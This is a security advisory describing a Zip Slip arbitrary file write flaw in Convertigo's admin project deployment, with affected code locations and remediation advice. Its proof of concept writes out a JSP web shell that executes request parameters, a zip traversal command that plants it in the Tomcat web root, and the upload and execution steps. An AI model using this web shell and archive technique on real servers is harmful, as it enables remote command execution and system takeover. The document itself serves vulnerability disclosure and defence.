# Convertigo Zip Slip Arbitrary File Write Vulnerability

- **Submitter:** sh7err
- **Vendor/Product:** Convertigo SA / Convertigo Low Code Platform (engine module)
- **Tested Version:** master branch (commit snapshot from repository at time of audit, product version string present as 8.x)
- **Vulnerability Type:** Zip Slip (Directory Traversal leading to Arbitrary File Write)
- **CWE:** CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

## Summary
Convertigo's administrative project deployment pipeline fails to sanitize filenames while expanding uploaded project archives. By embedding traversal sequences inside archive entries, an authenticated attacker with project deployment privileges can write arbitrary files anywhere on the server filesystem, enabling takeover scenarios such as planting web shells or modifying critical configuration.

## Affected Components
- `engine/src/com/twinsoft/convertigo/engine/util/ZipUtils.java` (`expandZip`)
- `engine/src/com/twinsoft/convertigo/engine/DatabaseObjectsManager.java` (`deployProject`)
- `engine/src/com/twinsoft/convertigo/engine/admin/services/UploadService.java`
- `engine/src/com/twinsoft/convertigo/engine/admin/services/projects/Deploy.java`

## Technical Details
1. `Deploy` admin service (`engine/src/com/twinsoft/convertigo/engine/admin/services/projects/Deploy.java:60`) accepts `.car` or `.zip` uploads from users with roles `WEB_ADMIN`, `TRIAL`, or `PROJECTS_CONFIG`. The uploaded archive is stored verbatim under `Engine.PROJECTS_PATH` via `UploadService.doUpload` (`engine/src/com/twinsoft/convertigo/engine/admin/services/UploadService.java:63`).
2. `DatabaseObjectsManager.deployProject` (`engine/src/com/twinsoft/convertigo/engine/DatabaseObjectsManager.java:820`) extracts the uploaded archive using `ZipUtils.expandZip` without performing path validation on individual entries.
3. Inside `ZipUtils.expandZip` (`engine/src/com/twinsoft/convertigo/engine/util/ZipUtils.java:139-164`), the code truncates the project prefix and writes the entry to `new File(rootDir + "/" + entryName)` after blindly calling `mkdirs()` and `FileOutputStream`. No check ensures the resolved path remains within `rootDir`, allowing traversal payloads such as `ProjectName/../../../../tomcat/webapps/ROOT/shell.jsp` to escape the intended directory.
4. `_data`/`_private` filters only restrict specific subdirectories and do not mitigate `../` sequences. Even if project import fails later, the arbitrary file is already persisted during extraction.

## Proof of Concept
1. Prepare a malicious archive:
   ```bash
   mkdir -p exploit/ProjectName
   echo '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>' > exploit/shell.jsp
   pushd exploit
   zip -r malicious.car ProjectName/../../../../../../opt/tomcat/webapps/ROOT/shell.jsp shell.jsp
   popd
   ```
   The archive includes a minimal `ProjectName` directory to satisfy project detection logic; traversal sequences place `shell.jsp` in the web root.
2. Authenticate to the Convertigo admin console and call `POST /admin/services/projects/Deploy` with the crafted archive as the multipart upload payload.
3. After deployment, access `https://<server>/convertigo/ROOT/shell.jsp?cmd=id` to execute arbitrary commands with server privileges.

## Impact
An authenticated administrator or compromised admin account can achieve arbitrary file write anywhere on the filesystem, leading to remote code execution, privilege escalation, or data tampering. In hosted Convertigo environments, this jeopardizes the entire runtime.

## Suggested Remediation
- In `ZipUtils.expandZip`, resolve the canonical path of each destination and verify that it remains under `rootDir`. Reject entries containing `..`, absolute paths, or drive prefixes before extraction.
- Consider using a vetted archive extraction utility that enforces directory boundaries.
- Harden the deployment pipeline by staging archives in isolated directories and performing integrity checks prior to import.

## Timeline
- 2025-??-?? – Vulnerability identified during internal audit (no vendor contact yet).

## Credits
- Discovered by sh7err.

## References
- Convertigo open-source repository: https://github.com/convertigo/convertigo
